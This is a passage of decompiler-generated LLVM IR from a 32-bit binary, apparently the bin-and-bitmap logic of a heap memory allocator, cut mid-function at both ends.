dec_label_pc_8052c52:                             ; preds = %dec_label_pc_8052fef, %dec_label_pc_8053001, %dec_label_pc_8052c11, %dec_label_pc_8052c40
  %v0_8052c52 = load i32, i32* @edx, align 4
  %v1_8052c52 = add i32 %v0_8052c52, 8
  store i32 %v1_8052c52, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532cd

dec_label_pc_8052c5a:                             ; preds = %dec_label_pc_8052c19
  %v0_8052c5e = call i32 @function_8052b4e()
  store i32 %v0_8052c5e, i32* %eax.global-to-local, align 4
  %v3_8052c63 = and i8 %v0_8052bd0, 2
  %v4_8052c63 = icmp eq i8 %v3_8052c63, 0
  %v6_8052c63 = zext i8 %v3_8052c63 to i32
  %v9_8052c63 = and i32 %v1_8052bd0, -256
  %v10_8052c63 = or i32 %v9_8052c63, %v6_8052c63
  store i32 %v10_8052c63, i32* @ebx, align 4
  br i1 %v4_8052c63, label %dec_label_pc_8052d56.preheader, label %dec_label_pc_8052c70

dec_label_pc_8052c70:                             ; preds = %dec_label_pc_8052c5a
  store i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32* %stack_var_-92, align 4
  %v2_8052c78 = call i32 @function_8053791(i32* bitcast (i8* @global_var_8056ba0.207 to i32*))
  store i32 %v2_8052c78, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d56.preheader

dec_label_pc_8052d56.preheader:                   ; preds = %dec_label_pc_8052c70, %dec_label_pc_8052c23, %dec_label_pc_8052c5a
  %stack_var_-40.0.ph = phi i32 [ %v2_8052c27, %dec_label_pc_8052c23 ], [ %v0_8052c5e, %dec_label_pc_8052c70 ], [ %v0_8052c5e, %dec_label_pc_8052c5a ]
  %v0_8052d569 = load i32, i32* @global_var_8056be0.211, align 32
  store i32 %v0_8052d569, i32* @ebp, align 4
  %v9_8052d5c15 = icmp eq i32 %v0_8052d569, 134573012
  %v1_8052d6217 = icmp eq i1 %v9_8052d5c15, false
  br i1 %v1_8052d6217, label %dec_label_pc_8052c85.lr.ph, label %dec_label_pc_8052d68

dec_label_pc_8052c85.lr.ph:                       ; preds = %dec_label_pc_8052d56.preheader
  %v1_8052cac = add i32 %v1_8052f68, 16
  br label %dec_label_pc_8052c85

dec_label_pc_8052c85:                             ; preds = %dec_label_pc_8052c85.lr.ph, %dec_label_pc_8052d56
  %v1_805327f = phi i32 [ %v0_8052d569, %dec_label_pc_8052c85.lr.ph ], [ %v0_8052d56, %dec_label_pc_8052d56 ]
  %v1_8052c85 = add i32 %v1_805327f, 4
  %v2_8052c85 = inttoptr i32 %v1_8052c85 to i32*
  %v3_8052c85 = load i32, i32* %v2_8052c85, align 4
  %v1_8052c88 = add i32 %v1_805327f, 12
  %v2_8052c88 = inttoptr i32 %v1_8052c88 to i32*
  %v3_8052c88 = load i32, i32* %v2_8052c88, align 4
  store i32 %v3_8052c88, i32* @edx, align 4
  %v1_8052c8b = and i32 %v3_8052c85, -4
  store i32 %v1_8052c8b, i32* @edi, align 4
  br i1 %v6_8052c21, label %dec_label_pc_8052cb7, label %dec_label_pc_8052c98

dec_label_pc_8052c98:                             ; preds = %dec_label_pc_8052c85
  %v9_8052c98 = icmp eq i32 %v3_8052c88, 134573012
  %v1_8052c9e = icmp eq i1 %v9_8052c98, false
  br i1 %v1_8052c9e, label %dec_label_pc_8052cb7, label %dec_label_pc_8052ca0

dec_label_pc_8052ca0:                             ; preds = %dec_label_pc_8052c98
  %v1_8052ca0 = load i32, i32* @global_var_8056bd0.209, align 16
  %v12_8052ca0 = icmp eq i32 %v1_805327f, %v1_8052ca0
  %v1_8052ca6 = icmp eq i1 %v12_8052ca0, false
  br i1 %v1_8052ca6, label %dec_label_pc_8052cb7, label %dec_label_pc_8052ca8

dec_label_pc_8052ca8:                             ; preds = %dec_label_pc_8052ca0
  store i32 %v1_8052cac, i32* %eax.global-to-local, align 4
  %v6_8052cb1 = icmp ugt i32 %v1_8052c8b, %v1_8052cac
  br i1 %v6_8052cb1, label %dec_label_pc_8053268, label %dec_label_pc_8052cb7

dec_label_pc_8052cb7:                             ; preds = %dec_label_pc_8052ca8, %dec_label_pc_8052ca0, %dec_label_pc_8052c98, %dec_label_pc_8052c85
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %eax.global-to-local, align 4
  %v2_8052cbc = add i32 %v3_8052c88, 8
  %v3_8052cbc = inttoptr i32 %v2_8052cbc to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v3_8052cbc, align 4
  %v0_8052cbf = load i32, i32* @edx, align 4
  store i32 %v0_8052cbf, i32* @global_var_8056be0.211, align 4
  %v0_8052cc2 = load i32, i32* @edi, align 4
  %v15_8052cc2 = icmp eq i32 %v0_8052cc2, %v1_8052f68
  br i1 %v15_8052cc2, label %dec_label_pc_80532a9, label %dec_label_pc_8052ccc

dec_label_pc_8052ccc:                             ; preds = %dec_label_pc_8052cb7
  %v6_8052cd2 = icmp ugt i32 %v0_8052cc2, 255
  br i1 %v6_8052cd2, label %dec_label_pc_8052ce5, label %dec_label_pc_8052cd4

dec_label_pc_8052cd4:                             ; preds = %dec_label_pc_8052ccc
  %v2_8052cd6 = udiv i32 %v0_8052cc2, 8
  store i32 %v2_8052cd6, i32* %esi.global-to-local, align 4
  %v1_8052cd9 = mul nuw i32 %v2_8052cd6, 8
  %v2_8052cd9 = add i32 %v1_8052cd9, 134573004
  store i32 %v2_8052cd9, i32* @ebx, align 4
  %v1_8052ce0 = add i32 %v1_8052cd9, 134573012
  %v2_8052ce0 = inttoptr i32 %v1_8052ce0 to i32*
  %v3_8052ce0 = load i32, i32* %v2_8052ce0, align 4
  store i32 %v3_8052ce0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d2e

dec_label_pc_8052ce5:                             ; preds = %dec_label_pc_8052ccc
  store i32 %v0_8052cc2, i32* @eax, align 4
  %v0_8052ce7 = call i32 @function_8052b4e()
  store i32 %v0_8052ce7, i32* %esi.global-to-local, align 4
  %v1_8052cee = mul i32 %v0_8052ce7, 8
  %v2_8052cee = add i32 %v1_8052cee, ptrtoint (i32* @global_var_8056bcc.208 to i32)
  store i32 %v2_8052cee, i32* %eax.global-to-local, align 4
  %v1_8052cf5 = add i32 %v1_8052cee, add (i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), i32 8)
  %v2_8052cf5 = inttoptr i32 %v1_8052cf5 to i32*
  %v3_8052cf5 = load i32, i32* %v2_8052cf5, align 4
  store i32 %v3_8052cf5, i32* %edx.global-to-local, align 4
  store i32 %v3_8052cf5, i32* @ebx, align 4
  %v12_8052cfe = icmp eq i32 %v3_8052cf5, %v2_8052cee
  br i1 %v12_8052cfe, label %dec_label_pc_8052d2e, label %dec_label_pc_8052d02

dec_label_pc_8052d02:                             ; preds = %dec_label_pc_8052ce5
  %v1_8052d02 = add i32 %v1_8052cee, add (i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), i32 12)
  %v2_8052d02 = inttoptr i32 %v1_8052d02 to i32*
  %v3_8052d02 = load i32, i32* %v2_8052d02, align 4
  store i32 %v3_8052d02, i32* @ebx, align 4
  %v0_8052d05 = load i32, i32* @edi, align 4
  %v2_8052d05 = add i32 %v3_8052d02, 4
  %v3_8052d05 = inttoptr i32 %v2_8052d05 to i32*
  %v4_8052d05 = load i32, i32* %v3_8052d05, align 4
  %v10_8052d05 = icmp ult i32 %v0_8052d05, %v4_8052d05
  %v1_8052d08 = icmp eq i1 %v10_8052d05, false
  br i1 %v1_8052d08, label %dec_label_pc_8052d10, label %dec_label_pc_8052d2e

dec_label_pc_8052d10:                             ; preds = %dec_label_pc_8052d02
  %v1_8052d12 = or i32 %v0_8052d05, 1
  store i32 %v1_8052d12, i32* %eax.global-to-local, align 4
  store i32 %v3_8052cf5, i32* %ebx.global-to-local, align 4
  %v2_8052d26105 = add i32 %v3_8052cf5, 4
  %v3_8052d26106 = inttoptr i32 %v2_8052d26105 to i32*
  %v4_8052d26107 = load i32, i32* %v3_8052d26106, align 4
  %v10_8052d26108 = icmp ult i32 %v1_8052d12, %v4_8052d26107
  br i1 %v10_8052d26108, label %dec_label_pc_8052d17, label %dec_label_pc_8052d2b

dec_label_pc_8052d17:                             ; preds = %dec_label_pc_8052d10, %dec_label_pc_8052d17
  %v0_8052d2b109 = phi i32 [ %v3_8052d1b, %dec_label_pc_8052d17 ], [ %v3_8052cf5, %dec_label_pc_8052d10 ]
  store i32 %v0_8052d2b109, i32* %ecx.global-to-local, align 4
  %v1_8052d1b = add i32 %v0_8052d2b109, 8
  %v2_8052d1b = inttoptr i32 %v1_8052d1b to i32*
  %v3_8052d1b = load i32, i32* %v2_8052d1b, align 4
  store i32 %v3_8052d1b, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052d1b, i32* %ebx.global-to-local, align 4
  %v2_8052d26 = add i32 %v3_8052d1b, 4
  %v3_8052d26 = inttoptr i32 %v2_8052d26 to i32*
  %v4_8052d26 = load i32, i32* %v3_8052d26, align 4
  %v10_8052d26 = icmp ult i32 %v1_8052d12, %v4_8052d26
  br i1 %v10_8052d26, label %dec_label_pc_8052d17, label %dec_label_pc_8052d2b

dec_label_pc_8052d2b:                             ; preds = %dec_label_pc_8052d17, %dec_label_pc_8052d10
  %v0_8052d2b.lcssa = phi i32 [ %v3_8052cf5, %dec_label_pc_8052d10 ], [ %v3_8052d1b, %dec_label_pc_8052d17 ]
  %v1_8052d2b = add i32 %v0_8052d2b.lcssa, 12
  %v2_8052d2b = inttoptr i32 %v1_8052d2b to i32*
  %v3_8052d2b = load i32, i32* %v2_8052d2b, align 4
  store i32 %v3_8052d2b, i32* @ebx, align 4
  br label %dec_label_pc_8052d2e

dec_label_pc_8052d2e:                             ; preds = %dec_label_pc_8052cd4, %dec_label_pc_8052d02, %dec_label_pc_8052ce5, %dec_label_pc_8052d2b
  %v0_8052d2e = phi i32 [ %v0_8052ce7, %dec_label_pc_8052ce5 ], [ %v0_8052ce7, %dec_label_pc_8052d2b ], [ %v0_8052ce7, %dec_label_pc_8052d02 ], [ %v2_8052cd6, %dec_label_pc_8052cd4 ]
  %stack_var_-64.1 = phi i32 [ %v2_8052cee, %dec_label_pc_8052ce5 ], [ %v0_8052d2b.lcssa, %dec_label_pc_8052d2b ], [ %v2_8052cee, %dec_label_pc_8052d02 ], [ %v3_8052ce0, %dec_label_pc_8052cd4 ]
  %v1_8052d30 = urem i32 %v0_8052d2e, 32
  %v2_8052d30 = icmp eq i32 %v1_8052d30, 0
  store i32 %v1_8052d30, i32* %esi.global-to-local, align 4
  store i32 %v1_8052d30, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052d3a = sdiv i32 %v0_8052d2e, 32
  store i32 %v2_8052d3a, i32* %edx.global-to-local, align 4
  br i1 %v2_8052d30, label %dec_label_pc_8052d56, label %bb

bb:                                               ; preds = %dec_label_pc_8052d2e
  %v5_8052d3d = shl i32 1, %v1_8052d30
  store i32 %v5_8052d3d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d56

dec_label_pc_8052d56:                             ; preds = %dec_label_pc_8052d2e, %bb
  %v5_8052d3f = phi i32 [ 1, %dec_label_pc_8052d2e ], [ %v5_8052d3d, %bb ]
  %v1_8052d3f = mul nsw i32 %v2_8052d3a, 4
  %v2_8052d3f = add i32 %v1_8052d3f, ptrtoint (i32* @global_var_8056ed4.212 to i32)
  %v3_8052d3f = inttoptr i32 %v2_8052d3f to i32*
  %v4_8052d3f = load i32, i32* %v3_8052d3f, align 4
  %v6_8052d3f = or i32 %v4_8052d3f, %v5_8052d3f
  store i32 %v6_8052d3f, i32* %v3_8052d3f, align 4
  %v0_8052d46 = load i32, i32* @ebx, align 4
  %v1_8052d46 = load i32, i32* @ebp, align 4
  %v2_8052d46 = add i32 %v1_8052d46, 12
  %v3_8052d46 = inttoptr i32 %v2_8052d46 to i32*
  store i32 %v0_8052d46, i32* %v3_8052d46, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052d4d = load i32, i32* @ebp, align 4
  %v2_8052d4d = add i32 %v1_8052d4d, 8
  %v3_8052d4d = inttoptr i32 %v2_8052d4d to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052d4d, align 4
  %v0_8052d50 = load i32, i32* @ebp, align 4
  %v1_8052d50 = load i32, i32* @ebx, align 4
  %v2_8052d50 = add i32 %v1_8052d50, 8
  %v3_8052d50 = inttoptr i32 %v2_8052d50 to i32*
  store i32 %v0_8052d50, i32* %v3_8052d50, align 4
  %v0_8052d53 = load i32, i32* @ebp, align 4
  %v1_8052d53 = load i32, i32* @esi, align 4
  %v2_8052d53 = add i32 %v1_8052d53, 12
  %v3_8052d53 = inttoptr i32 %v2_8052d53 to i32*
  store i32 %v0_8052d53, i32* %v3_8052d53, align 4
  %v0_8052d56 = load i32, i32* @global_var_8056be0.211, align 32
  store i32 %v0_8052d56, i32* @ebp, align 4
  %v9_8052d5c = icmp eq i32 %v0_8052d56, 134573012
  %v1_8052d62 = icmp eq i1 %v9_8052d5c, false
  br i1 %v1_8052d62, label %dec_label_pc_8052c85, label %dec_label_pc_8052d68

dec_label_pc_8052d68:                             ; preds = %dec_label_pc_8052d56, %dec_label_pc_8052d56.preheader
  br i1 %v8_8052c19, label %dec_label_pc_8052df6, label %dec_label_pc_8052d76

dec_label_pc_8052d76:                             ; preds = %dec_label_pc_8052d68
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052d7a = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052d7a = add i32 %v1_8052d7a, ptrtoint (i32* @global_var_8056bcc.208 to i32)
  store i32 %v2_8052d7a, i32* %edx.global-to-local, align 4
  %v1_8052d81 = add i32 %v1_8052d7a, add (i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), i32 12)
  %v2_8052d81 = inttoptr i32 %v1_8052d81 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052d81, align 4
  br label %dec_label_pc_8052df2

dec_label_pc_8052d86:                             ; preds = %dec_label_pc_8052df2
  %v1_8052d86 = add i32 %v4_8052d9d, 4
  %v2_8052d86 = inttoptr i32 %v1_8052d86 to i32*
  %v3_8052d86 = load i32, i32* %v2_8052d86, align 4
  store i32 %v3_8052d86, i32* %ebx.global-to-local, align 4
  %v1_8052d89 = add i32 %v4_8052d9d, 12
  %v2_8052d89 = inttoptr i32 %v1_8052d89 to i32*
  %v3_8052d89 = load i32, i32* %v2_8052d89, align 4
  store i32 %v3_8052d89, i32* @ecx, align 4
  %v1_8052d8c = and i32 %v3_8052d86, -4
  store i32 %v1_8052d8c, i32* @ebx, align 4
  %v10_8052d8f = icmp ult i32 %v1_8052d8c, %v1_8052f68
  br i1 %v10_8052d8f, label %dec_label_pc_8052df2, label %dec_label_pc_8052d95

dec_label_pc_8052d95:                             ; preds = %dec_label_pc_8052d86
  %v1_8052d95 = add i32 %v4_8052d9d, 8
  %v2_8052d95 = inttoptr i32 %v1_8052d95 to i32*
  %v3_8052d95 = load i32, i32* %v2_8052d95, align 4
  store i32 %v3_8052d95, i32* @edx, align 4
  %v1_8052d98 = add i32 %v3_8052d95, 12
  %v2_8052d98 = inttoptr i32 %v1_8052d98 to i32*
  %v3_8052d98 = load i32, i32* %v2_8052d98, align 4
  %v15_8052d98 = icmp eq i32 %v3_8052d98, %v4_8052d9d
  %v1_8052d9b = icmp eq i1 %v15_8052d98, false
  br i1 %v1_8052d9b, label %dec_label_pc_8052da2, label %dec_label_pc_8052d9d

dec_label_pc_8052d9d:                             ; preds = %dec_label_pc_8052d95
  %v1_8052d9d = add i32 %v3_8052d89, 8
  %v2_8052d9d = inttoptr i32 %v1_8052d9d to i32*
  %v3_8052d9d = load i32, i32* %v2_8052d9d, align 4
  %v15_8052d9d = icmp eq i32 %v3_8052d9d, %v4_8052d9d
  br i1 %v15_8052d9d, label %dec_label_pc_8052da7, label %dec_label_pc_8052da2

dec_label_pc_8052da2:                             ; preds = %dec_label_pc_8052d9d, %dec_label_pc_8052d95
  %v0_8052da2 = call i32 @function_8053ad5()
  store i32 %v0_8052da2, i32* %eax.global-to-local, align 4
  %v0_8052da7.pre = load i32, i32* @ebx, align 4
  %v0_8052dad.pre = load i32, i32* @ecx, align 4
  %v1_8052dad.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052da7

dec_label_pc_8052da7:                             ; preds = %dec_label_pc_8052d9d, %dec_label_pc_8052da2
  %v1_8052dad = phi i32 [ %v3_8052d95, %dec_label_pc_8052d9d ], [ %v1_8052dad.pre, %dec_label_pc_8052da2 ]
  %v0_8052dad = phi i32 [ %v3_8052d89, %dec_label_pc_8052d9d ], [ %v0_8052dad.pre, %dec_label_pc_8052da2 ]
  %v0_8052da7 = phi i32 [ %v1_8052d8c, %dec_label_pc_8052d9d ], [ %v0_8052da7.pre, %dec_label_pc_8052da2 ]
  %v5_8052da9 = sub i32 %v0_8052da7, %v1_8052f68
  store i32 %v5_8052da9, i32* %esi.global-to-local, align 4
  %v2_8052dad = add i32 %v1_8052dad, 12
  %v3_8052dad = inttoptr i32 %v2_8052dad to i32*
  store i32 %v0_8052dad, i32* %v3_8052dad, align 4
  %v0_8052db0 = load i32, i32* @edx, align 4
  %v1_8052db0 = load i32, i32* @ecx, align 4
  %v2_8052db0 = add i32 %v1_8052db0, 8
  %v3_8052db0 = inttoptr i32 %v2_8052db0 to i32*
  store i32 %v0_8052db0, i32* %v3_8052db0, align 4
  %v0_8052db3 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052db6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052db6 = add i32 %v0_8052db6, 8
  store i32 %v1_8052db6, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052db3, 16
  br i1 %tmp126, label %dec_label_pc_80532b7, label %dec_label_pc_8052dbf

dec_label_pc_8052dbf:                             ; preds = %dec_label_pc_8052da7
  %v2_8052dc3 = add i32 %v0_8052db6, %v1_8052f68
  store i32 %v2_8052dc3, i32* @edx, align 4
  %v1_8052dc6 = or i32 %v1_8052f68, 1
  store i32 %v1_8052dc6, i32* %ebx.global-to-local, align 4
  %v2_8052dc9 = add i32 %v0_8052db6, 4
  %v3_8052dc9 = inttoptr i32 %v2_8052dc9 to i32*
  store i32 %v1_8052dc6, i32* %v3_8052dc9, align 4
  %v0_8052dcc = load i32, i32* %esi.global-to-local, align 4
  %v1_8052dce = or i32 %v0_8052dcc, 1
  store i32 %v1_8052dce, i32* %eax.global-to-local, align 4
  %v0_8052dd1 = load i32, i32* @edx, align 4
  %v1_8052dd1 = load i32, i32* @ebp, align 4
  %v2_8052dd1 = add i32 %v1_8052dd1, 8
  %v3_8052dd1 = inttoptr i32 %v2_8052dd1 to i32*
  store i32 %v0_8052dd1, i32* %v3_8052dd1, align 4
  %v0_8052dd4 = load i32, i32* @edx, align 4
  %v1_8052dd4 = load i32, i32* @ebp, align 4
  %v2_8052dd4 = add i32 %v1_8052dd4, 12
  %v3_8052dd4 = inttoptr i32 %v2_8052dd4 to i32*
  store i32 %v0_8052dd4, i32* %v3_8052dd4, align 4
  %v0_8052dd7 = load i32, i32* @edx, align 4
  %v1_8052dd7 = add i32 %v0_8052dd7, 8
  %v2_8052dd7 = inttoptr i32 %v1_8052dd7 to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8052dd7, align 4
  %v0_8052dde = load i32, i32* @edx, align 4
  %v1_8052dde = add i32 %v0_8052dde, 12
  %v2_8052dde = inttoptr i32 %v1_8052dde to i32*
  store i32 ptrtoint (i32* @global_var_8056bd4.210 to i32), i32* %v2_8052dde, align 4
  %v0_8052de5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052de5 = load i32, i32* @edx, align 4
  %v2_8052de5 = add i32 %v1_8052de5, 4
  %v3_8052de5 = inttoptr i32 %v2_8052de5 to i32*
  store i32 %v0_8052de5, i32* %v3_8052de5, align 4
  %v0_8052de8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052de8 = load i32, i32* @edx, align 4
  %v3_8052de8 = add i32 %v1_8052de8, %v0_8052de8
  %v4_8052de8 = inttoptr i32 %v3_8052de8 to i32*
  store i32 %v0_8052de8, i32* %v4_8052de8, align 4
  br label %dec_label_pc_80532bc

dec_label_pc_8052df2:                             ; preds = %dec_label_pc_8052d86, %dec_label_pc_8052d76
  %v4_8052d9d = phi i32 [ %storemerge1.pre, %dec_label_pc_8052d76 ], [ %v3_8052d89, %dec_label_pc_8052d86 ]
  store i32 %v4_8052d9d, i32* %eax.global-to-local, align 4
  %v12_8052df2 = icmp eq i32 %v4_8052d9d, %v2_8052d7a
  %v1_8052df4 = icmp eq i1 %v12_8052df2, false
  br i1 %v1_8052df4, label %dec_label_pc_8052d86, label %dec_label_pc_8052df6.loopexit

dec_label_pc_8052df6.loopexit:                    ; preds = %dec_label_pc_8052df2
  br label %dec_label_pc_8052df6

dec_label_pc_8052df6:                             ; preds = %dec_label_pc_8052df6.loopexit, %dec_label_pc_8052d68
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052dff = add i32 %stack_var_-40.0.ph, 1
  %v2_8052e02 = udiv i32 %v1_8052dff, 32
  store i32 %v2_8052e02, i32* @edi, align 4
  %v1_8052e05 = mul i32 %v1_8052dff, 8
  %v2_8052e05 = add i32 %v1_8052e05, ptrtoint (i32* @global_var_8056bcc.208 to i32)
  store i32 %v2_8052e05, i32* %ebx.global-to-local, align 4
  %v1_8052e0c = urem i32 %v1_8052dff, 32
  %v2_8052e0c = icmp eq i32 %v1_8052e0c, 0
  store i32 %v1_8052e0c, i32* %ecx.global-to-local, align 4
  %v1_8052e0f = mul nuw nsw i32 %v2_8052e02, 4
  %v2_8052e0f = add i32 %v1_8052e0f, ptrtoint (i32* @global_var_8056ed4.212 to i32)
  %v3_8052e0f = inttoptr i32 %v2_8052e0f to i32*
  %v4_8052e0f = load i32, i32* %v3_8052e0f, align 4
  store i32 %v4_8052e0f, i32* %edx.global-to-local, align 4
  br i1 %v2_8052e0c, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8052df6
  %v5_8052e16 = shl i32 1, %v1_8052e0c
  store i32 %v5_8052e16, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052df6, %bb88, %dec_label_pc_8052e57
  %v1_8052e18 = phi i32 [ %v1_8052e18.pre, %dec_label_pc_8052e57 ], [ %v4_8052e0f, %bb88 ], [ %v4_8052e0f, %dec_label_pc_8052df6 ]
  %v0_8052e1c = phi i32 [ %v0_8052e18.pre, %dec_label_pc_8052e57 ], [ %v5_8052e16, %bb88 ], [ 1, %dec_label_pc_8052df6 ]
  %tmp89 = icmp ule i32 %v0_8052e1c, %v1_8052e18
  %v1_8052e1c = icmp eq i32 %v0_8052e1c, 0
  %v1_8052e1e = icmp eq i1 %v1_8052e1c, false
  %or.cond = and i1 %tmp89, %v1_8052e1e
  br i1 %or.cond, label %dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge, label %dec_label_pc_8052e20.preheader

dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge: ; preds = %.preheader
  %v0_8052e477.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052e4c.preheader

dec_label_pc_8052e20.preheader:                   ; preds = %.preheader
  %v0_8052e20.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052e20

dec_label_pc_8052e20:                             ; preds = %dec_label_pc_8052e20.preheader, %dec_label_pc_8052e2a
  %v0_8052e20 = phi i32 [ %v0_8052e20.pre, %dec_label_pc_8052e20.preheader ], [ %v1_8052e20, %dec_label_pc_8052e2a ]
  %v1_8052e20 = add i32 %v0_8052e20, 1
  store i32 %v1_8052e20, i32* @edi, align 4
  %v6_8052e24 = icmp ugt i32 %v1_8052e20, 2
  br i1 %v6_8052e24, label %dec_label_pc_8052ed3.loopexit, label %dec_label_pc_8052e2a

dec_label_pc_8052e2a:                             ; preds = %dec_label_pc_8052e20
  %v1_8052e2a = mul i32 %v1_8052e20, 4
  %v2_8052e2a = add i32 %v1_8052e2a, ptrtoint (i32* @global_var_8056ed4.212 to i32)
  %v3_8052e2a = inttoptr i32 %v2_8052e2a to i32*
  %v4_8052e2a = load i32, i32* %v3_8052e2a, align 4
  store i32 %v4_8052e2a, i32* %edx.global-to-local, align 4
  %v1_8052e31 = icmp eq i32 %v4_8052e2a, 0
  br i1 %v1_8052e31, label %dec_label_pc_8052e20, label %dec_label_pc_8052e35

dec_label_pc_8052e35:                             ; preds = %dec_label_pc_8052e2a
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052e3c = mul i32 %v1_8052e20, 256
  store i32 %v2_8052e3c, i32* %eax.global-to-local, align 4
  %v1_8052e3f = add i32 %v2_8052e3c, ptrtoint (i32* @global_var_8056bcc.208 to i32)
  store i32 %v1_8052e3f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052e4c.preheader

dec_label_pc_8052e4c.preheader:                   ; preds = %dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge, %dec_label_pc_8052e35
  %v0_8052e477 = phi i32 [ %v1_8052e3f, %dec_label_pc_8052e35 ], [ %v0_8052e477.pre, %dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052e35 ], [ %v0_8052e1c, %dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge ]
  %v0_8052e5e = phi i32 [ %v4_8052e2a, %dec_label_pc_8052e35 ], [ %v1_8052e18, %dec_label_pc_8052e1c.dec_label_pc_8052e4c.preheader_crit_edge ]
  %v2_8052e4c4 = and i32 %v0_8052e5e, %esi.promoted
  %v3_8052e4c5 = icmp eq i32 %v2_8052e4c4, 0
  br i1 %v3_8052e4c5, label %dec_label_pc_8052e47, label %dec_label_pc_8052e50

dec_label_pc_8052e47:                             ; preds = %dec_label_pc_8052e4c.preheader, %dec_label_pc_8052e47
  %v2_8052e4a18 = phi i32 [ %v2_8052e4a, %dec_label_pc_8052e47 ], [ %esi.promoted, %dec_label_pc_8052e4c.preheader ]
  %v0_8052e478 = phi i32 [ %v1_8052e47, %dec_label_pc_8052e47 ], [ %v0_8052e477, %dec_label_pc_8052e4c.preheader ]
  %v1_8052e47 = add i32 %v0_8052e478, 8
  %v2_8052e4a = mul i32 %v2_8052e4a18, 2
  %v2_8052e4c = and i32 %v2_8052e4a, %v0_8052e5e
  %v3_8052e4c = icmp eq i32 %v2_8052e4c, 0
  br i1 %v3_8052e4c, label %dec_label_pc_8052e47, label %dec_label_pc_8052e4c.dec_label_pc_8052e50_crit_edge

dec_label_pc_8052e4c.dec_label_pc_8052e50_crit_edge: ; preds = %dec_label_pc_8052e47
  store i32 %v1_8052e47, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052e4a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052e50

dec_label_pc_8052e50:                             ; preds = %dec_label_pc_8052e4c.dec_label_pc_8052e50_crit_edge, %dec_label_pc_8052e4c.preheader
  %v0_8052e60 = phi i32 [ %v2_8052e4a, %dec_label_pc_8052e4c.dec_label_pc_8052e50_crit_edge ], [ %esi.promoted, %dec_label_pc_8052e4c.preheader ]
  %v1_8052e7a = phi i32 [ %v1_8052e47, %dec_label_pc_8052e4c.dec_label_pc_8052e50_crit_edge ], [ %v0_8052e477, %dec_label_pc_8052e4c.preheader ]
  %v1_8052e50 = add i32 %v1_8052e7a, 12
  %v2_8052e50 = inttoptr i32 %v1_8052e50 to i32*
  %v3_8052e50 = load i32, i32* %v2_8052e50, align 4
  store i32 %v3_8052e50, i32* %ecx.global-to-local, align 4
  %v12_8052e53 = icmp eq i32 %v3_8052e50, %v1_8052e7a
  %v1_8052e55 = icmp eq i1 %v12_8052e53, false
  br i1 %v1_8052e55, label %dec_label_pc_8052e6b, label %dec_label_pc_8052e57

dec_label_pc_8052e57:                             ; preds = %dec_label_pc_8052e50
  %v1_8052e59 = add i32 %v3_8052e50, 8
  store i32 %v1_8052e59, i32* %ebx.global-to-local, align 4
  %v1_8052e5c = sub i32 -1, %v0_8052e60
  store i32 %v1_8052e5c, i32* %eax.global-to-local, align 4
  %v2_8052e5e = and i32 %v0_8052e5e, %v1_8052e5c
  store i32 %v2_8052e5e, i32* %edx.global-to-local, align 4
  %v2_8052e60 = mul i32 %v0_8052e60, 2
  store i32 %v2_8052e60, i32* %esi.global-to-local, align 4
  %v1_8052e62 = load i32, i32* @edi, align 4
  %v2_8052e62 = mul i32 %v1_8052e62, 4
  %v3_8052e62 = add i32 %v2_8052e62, ptrtoint (i32* @global_var_8056ed4.212 to i32)
  %v4_8052e62 = inttoptr i32 %v3_8052e62 to i32*
  store i32 %v2_8052e5e, i32* %v4_8052e62, align 4
  %v0_8052e18.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e18.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052e6b:                             ; preds = %dec_label_pc_8052e50
  %v1_8052e6b = add i32 %v3_8052e50, 4
  %v2_8052e6b = inttoptr i32 %v1_8052e6b to i32*
  %v3_8052e6b = load i32, i32* %v2_8052e6b, align 4
  store i32 %v3_8052e6b, i32* %edx.global-to-local, align 4
  %v1_8052e6e = add i32 %v3_8052e50, 12
  %v2_8052e6e = inttoptr i32 %v1_8052e6e to i32*
  %v3_8052e6e = load i32, i32* %v2_8052e6e, align 4
  store i32 %v3_8052e6e, i32* %eax.global-to-local, align 4
  %v1_8052e71 = and i32 %v3_8052e6b, -4
  store i32 %v1_8052e71, i32* @edx, align 4
